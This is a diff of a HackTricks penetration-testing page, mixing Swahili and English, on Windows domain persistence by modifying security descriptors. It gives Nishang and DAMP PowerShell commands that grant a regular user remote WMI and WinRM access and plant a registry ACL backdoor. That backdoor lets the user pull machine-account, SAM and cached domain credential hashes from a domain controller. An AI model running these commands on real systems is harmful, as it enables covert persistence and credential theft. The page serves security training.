@@ -1,32 +1,32 @@
-# Vibainishi vya Usalama
+# Security Descriptors
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Vibainishi vya Usalama
+## Security Descriptors
 
-[Kutoka kwenye docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) hufafanua muundo unaotumiwa kueleza security descriptor. SDDL hutumia ACE strings kwa DACL na SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>
+Windows security descriptors zina SID ya mmiliki, SID ya primary-group, discretionary ACL (DACL) inayodhibiti access, na system ACL (SACL) inayotumika hasa kwa auditing. Security Descriptor Definition Language (SDDL) ni uwakilishi wa maandishi; string ya ACE ina muundo `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>
 
-**security descriptors** hutumiwa **kuhifadhi** **ruhusa** ambazo **object** inazo **juu ya** **object** nyingine. Ikiwa unaweza kufanya **mabadiliko** **madogo** katika **security descriptor** ya object, unaweza kupata privileges za kuvutia sana juu ya object hiyo bila kuhitaji kuwa mwanachama wa privileged group.
+Security descriptor huhifadhi taarifa kuhusu nani anamiliki securable object na ni principals gani wanaoruhusiwa au kunyimwa rights maalum juu yake. Ikiwa attacker anaweza kubadilisha DACL, anaweza kumpa principal mwenye privileges ndogo rights ambazo kwa kawaida zinahitaji administrative role.
 
-Kwa hiyo, mbinu hii ya persistence inategemea uwezo wa kupata kila privilege inayohitajika dhidi ya objects fulani, ili kuweza kutekeleza kazi ambayo kwa kawaida huhitaji admin privileges, lakini bila kuhitaji kuwa admin.
+Hii hufanya descriptors zilizorekebishwa kwa kiasi kidogo kuwa muhimu kwa persistence: account hubaki nje ya privileged groups zinazoonekana wazi huku ikiendelea kuwa na access kwenye management surface fulani. Hifadhi descriptor ya awali kabla ya kuifanyia majaribio ili mabadiliko yaweze kuondolewa kwa usahihi.
 
-### Ufikiaji wa WMI
+### Access to WMI
 
-Unaweza kumpa user ufikiaji wa **kutekeleza WMI kwa mbali** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
+Unaweza kumpa user access ya **kutekeleza WMI kwa mbali** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
 ```bash
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
 ```
-### Access to WinRM
+### Ufikiaji wa WinRM
 
-Toa access ya **winrm PS console kwa mtumiaji** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
+Mpe mtumiaji ufikiaji wa endpoint ya mbali ya PowerShell/WinRM ukitumia function ya Nishang `Set-RemotePSRemoting`:<sup>[[2]](#references)</sup>
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 ### Ufikiaji wa mbali wa hashes
 
-Pata ufikiaji wa **registry** na **dump hashes** kwa kuunda **Reg backdoor ukitumia** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ili uweze wakati wowote kupata **hash ya computer**, **SAM** na credential yoyote ya **AD** iliyohifadhiwa kwenye computer. Kwa hiyo, ni muhimu sana kumpa **regular user** ruhusa hii dhidi ya **Domain Controller computer**:<sup>[[3]](#references)</sup>
+DAMP inaweza kuunda registry-ACL backdoor ambayo baadaye inaruhusu retrieval ya mbali ya machine-account hash, local SAM hashes, na cached domain credentials. Kutoa ruhusa hizi finyu kwa account ambayo kwa kawaida si ya privileged—hasa dhidi ya domain controller—hutoa persistence yenye nguvu bila membership ya privileged-group.<sup>[[3]](#references)</sup>
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -42,10 +42,10 @@ Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
 Angalia [**Silver Tickets**](silver-ticket.md) ili kujifunza jinsi unavyoweza kutumia hash ya computer account ya Domain Controller.
 
-## Marejeleo
+## References
 
-- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
+- [1] [Lugha ya Ufafanuzi wa Security Descriptor - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
 - [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
-- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
-
+- [3] [DAMP - Mradi wa Marekebisho ya ACL za Hiari](https://github.com/HarmJ0y/DAMP)
+- [4] [Microsoft Learn — Muundo wa mfuatano wa security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
 {{#include ../../banners/hacktricks-training.md}}
